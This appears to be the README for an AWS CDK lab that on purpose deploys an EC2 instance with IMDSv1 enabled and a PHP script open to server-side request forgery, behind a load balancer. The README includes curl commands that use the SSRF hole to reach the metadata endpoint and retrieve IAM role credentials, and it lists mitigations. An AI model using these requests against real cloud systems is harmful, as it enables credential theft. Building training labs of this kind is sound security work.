# ALB + Private EC2 SSRF Vulnerability Demo

This CDK project demonstrates SSRF (Server-Side Request Forgery) vulnerability against IMDSv1 in a private subnet EC2 instance behind an Application Load Balancer.

## ⚠️ Security Warning

**This project is for educational and testing purposes only.** It intentionally creates vulnerable infrastructure with:
- IMDSv1 enabled (vulnerable to SSRF attacks)
- A PHP script with SSRF vulnerability
- Insecure network configurations

**DO NOT deploy this in production environments.**

## Architecture

- VPC with public and private subnets
- Application Load Balancer in public subnet
- EC2 instance in private subnet with IMDSv1 enabled
- Vulnerable PHP script for SSRF testing
- SSM endpoints for remote access

```mermaid
flowchart LR
  Internet
  
  subgraph aws["AWS Account"]
    subgraph VPC["VPC (10.0.0.0/16)"]
      subgraph publicsubnet
        ALB@{img: "https://api.iconify.design/logos/aws-elb.svg", label: "Application Load Balancer", pos: "b", w: 60, h: 60, constraint: "on"}

        NAT@{img: "https://api.iconify.design/logos/aws-vpc.svg", label: "NAT Gateway", pos: "b", w: 60, h: 60, constraint: "on"}
      end
        
      subgraph privatesubnet
        EC2@{img: "https://api.iconify.design/logos/aws-ec2.svg", label: "Instance<br>IMDSv1 Enabled<br>Vulnerable PHP", pos: "b", w: 60, h: 60, constraint: "on"}

        SSM_EP@{img: "https://api.iconify.design/logos/aws-systems-manager.svg", label: "SSM VPC Endpoints", pos: "b", w: 60, h: 60, constraint: "on"}
      end
    end
    
    S3@{img: "https://api.iconify.design/logos/aws-s3.svg", label: "Bucket<br>secret.txt", pos: "b", w: 60, h: 60, constraint: "on"}
  end
  
  Internet ~~~ publicsubnet ~~~ privatesubnet
  
  Internet --> ALB
  ALB --> EC2
  EC2 --> S3
  EC2 -.-> SSM_EP <-.-> admin
  
  class VPC vpc
  
  classDef group fill:none,stroke:none
```


## Prerequisites

- AWS CLI configured
- AWS CDK installed (`npm install -g aws-cdk`)
- Node.js and npm

## Deployment

```bash
npm install
cdk bootstrap
cdk deploy
```

## Testing SSRF Attack

After deployment, get the ALB DNS name from the output and test:

```bash
# Get IAM role credentials via SSRF
curl "http://[ALB_DNS_NAME]/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get specific role credentials
curl "http://[ALB_DNS_NAME]/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]"
```

## Cleanup

```bash
cdk destroy
```

## Security Mitigation

To secure this setup:
1. Enable IMDSv2 only (`requireImdsv2: true`)
2. Remove the vulnerable PHP script
3. Implement proper input validation
4. Use WAF to block malicious requests